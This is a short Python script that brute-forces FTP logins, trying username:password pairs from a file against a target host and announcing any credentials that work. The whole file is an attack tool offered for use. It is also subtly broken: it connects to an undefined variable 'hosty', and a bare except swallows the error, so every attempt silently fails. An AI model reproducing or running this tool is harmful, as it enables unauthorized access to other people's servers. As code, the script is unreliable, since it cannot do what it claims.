import ftplib
import optparse
from termcolor import colored


def bruteLogin(host, file):
    try:
            f =open(file, 'r')

    except:
            print("[-] File doesn't exsist or you don't have permmisions")
            return 0


    for line in f.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1].strip('\n')
        try:
            print("[+] Trying With User: " + username + " | Password: " + password)
            ftp = ftplib.FTP(hosty)
            login = ftp.login(username, password)
            print(colored("[+] Login Succeeded With User: " + username + " | Password: " + password, 'green'))
            ftp.quit()
            return 0
        except:
            pass

    print(colored("User and password wasn't found", 'red'))

parser = optparse.OptionParser('Usage of program: ' + '-H <target host>' + '-f<passwords list file path>')
parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
parser.add_option('-f', dest='tgtFile', type='string', help='specify passwords file path')
(options, args) = parser.parse_args()

host = options.tgtHost
file = options.tgtFile

if (host == None) and (file == None):
    print(parser.usage)
    exit(0)

if (host == None) or (file == None):
    parser.print_help()
    exit(0)

bruteLogin(host, file)